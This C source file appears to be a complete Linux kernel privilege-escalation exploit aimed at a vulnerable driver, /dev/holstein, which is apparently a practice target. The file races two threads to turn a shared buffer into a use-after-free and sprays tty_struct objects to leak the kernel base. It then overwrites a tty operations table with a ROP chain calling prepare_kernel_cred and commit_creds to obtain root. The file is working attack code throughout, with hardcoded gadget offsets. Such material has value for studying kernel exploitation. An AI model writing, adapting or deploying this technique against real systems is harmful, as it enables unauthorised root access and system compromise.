#include <kpwn.h>

#define SPRAY_NUM 800
#define BUF_SIZE 0x400

#define ofs_tty_ops 0xc3afe0
#define prepare_kernel_cred (kbase + 0x72580)
#define commit_creds (kbase + 0x723e0)
#define pop_rdi_ret (kbase + 0xb13fd)
#define pop_rcx_pop2_ret (kbase + 0x309948)
#define push_rdx_pop_rsp_pop_ret (kbase + 0x137da6)
#define mov_rdi_rax_rep_movsq_ret (kbase + 0x65094b)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e26)

uint64_t kbase;
uint64_t g_buf;

int win = 0;
long fd1, fd2;


void *race(void *arg)
{
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) errExit("sched_setaffinity");

    while (1)
    {
        while (!win)
        {
            int fd = open("/dev/holstein", O_RDWR);
            if (fd == fd2)
                win = 1;
            if (win == 0 && fd != -1)
                close(fd);
        }
        if (write(fd1, "A", 1) != 1 || write(fd2, "a", 1) != 1)
        {
            close(fd1);
            close(fd2);
            win = 0;
        }
        else
            break;
        usleep(1000);
    }
    return NULL;
}

void *spray_thread(void *arg)
{
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) errExit("sched_setaffinity");

    long x;
    long spray[SPRAY_NUM];

    logInfo("spraying %d tty_struct objects", SPRAY_NUM);
    for (int i = 0; i < SPRAY_NUM; i++)
    {
        usleep(10);
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
        {
            for (int j = 0; j < i; j++)
                close(spray[j]);
            return (void *)-1;
        }
        if (read(fd2, &x, sizeof(long)) == sizeof(long) && x)
        {
            for (int j = 0; j < i; j++)
                close(spray[j]);
            return (void *)spray[i];
        }
    }
    for (int i = 0; i < SPRAY_NUM; i++)
        close(spray[i]);
    return (void *)-1;
}

int create_overlap()
{
    pthread_t th1, th2;
    char buf[0x10] = {0};
    cpu_set_t t1_cpu, t2_cpu;
    // cpu affinity
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    logOK("Opening /tmp to figure out next two fds");
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    logOK("Next two fds: fd1 %ld, fd2 %ld", fd1, fd2);

    logInfo("Running thread1 and thread2");
    pthread_create(&th1, NULL, race, (void *)&t1_cpu);
    pthread_create(&th2, NULL, race, (void *)&t2_cpu);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);

    logOK("Reached race condition");
    logInfo("Checking whether this race condition is effective");
    write(fd1, "AAAAAAAAA", 9);
    read(fd2, buf, 9);
    if (strcmp(buf, "AAAAAAAAA") != 0)
    {
        logErr("bad luck :(");
        exit(1);
    }
    memset(buf, 0, 9);
    write(fd1, buf, 9);
    logOK("Gotten effective race condtion");

    logInfo("Closing fd1 to create UAF situation");
    close(fd1); // create UAF

    long victim_fd = -1;
    victim_fd = (long)spray_thread((void *)&t1_cpu);
    while (victim_fd == -1)
    {
        logInfo("Spraying on another CPU");
        pthread_create(&th1, NULL, spray_thread, (void *)&t2_cpu);
        pthread_join(th1, (void *)&victim_fd);
    }

    logOK("Overlapped victim fd %d", (int)victim_fd);
    return victim_fd;
}

int main()
{
    save_state();

    char buf[BUF_SIZE] = {0};
    int victim_fd;

    logInfo("UAF #1: Create UAF and overlap with tty_struct");
    victim_fd = create_overlap();
    logInfo("Victim fd value: %d", victim_fd);

    logInfo("Leak kernel base address and g_buf address");
    if (read(fd2, buf, BUF_SIZE) != BUF_SIZE) errExit("read");
    // hex_dump(buf, BUF_SIZE);
    kbase = *(uint64_t *)&buf[0x18] - ofs_tty_ops;
    g_buf = *(uint64_t*)&buf[0x38] - 0x38;

    if ((g_buf & 0xffffffff00000000) == 0xffffffff00000000)
    {
        logErr("Heap spraying failed\n");
        exit(-1);
    }

    if (kbase & 0xfff) {
        logErr("Invalid kernel base, trying to fix by adding 0x120");
        kbase += 0x120;
    }

    logOK("Leaked kernel base: 0x%lx", kbase);
    logOK("Leaked g_buf address: 0x%lx", g_buf);

    logInfo("Crafting ROP chain");
    uint64_t idx = 0;
    uint64_t *rop = (uint64_t *)&buf;

    rop[idx++] = pop_rdi_ret;
    rop[idx++] = 0x0;
    rop[idx++] = prepare_kernel_cred;
    rop[idx++] = pop_rcx_pop2_ret;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = 0;
    rop[idx++] = mov_rdi_rax_rep_movsq_ret;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;
    rop[idx++] = 0x0;
    rop[idx++] = 0x0;
    rop[idx++] = user_rip;
    rop[idx++] = user_cs;
    rop[idx++] = user_rflags;
    rop[idx++] = user_rsp;
    rop[idx++] = user_ss;

    *(uint64_t *)&buf[0x3f8] = push_rdx_pop_rsp_pop_ret;

    logInfo("Overwrite tty_struct of target 1 with ROP chain and fake ioctl ops");
    if (write(fd2, buf, BUF_SIZE) != BUF_SIZE) errExit("write");
    logOK("Overwrote!");

    logInfo("UAF #2: Trigger ROP chain by calling ioctl on target 2");
    victim_fd = create_overlap();
    logInfo("Victim fd value: %d", victim_fd);

    logInfo("Overwrite tty_struct of target 2 with fake ops");
    read(fd2, buf, 0x20);
    *(uint64_t *)&buf[0x18] = g_buf + 0x3f8 - (12 * 8);
    write(fd2, buf, 0x20);

    logInfo("Triggering ROP chain");
    ioctl(victim_fd, 0, g_buf - 8);

    logErr("Should never reach here :(");

    return 0;
}
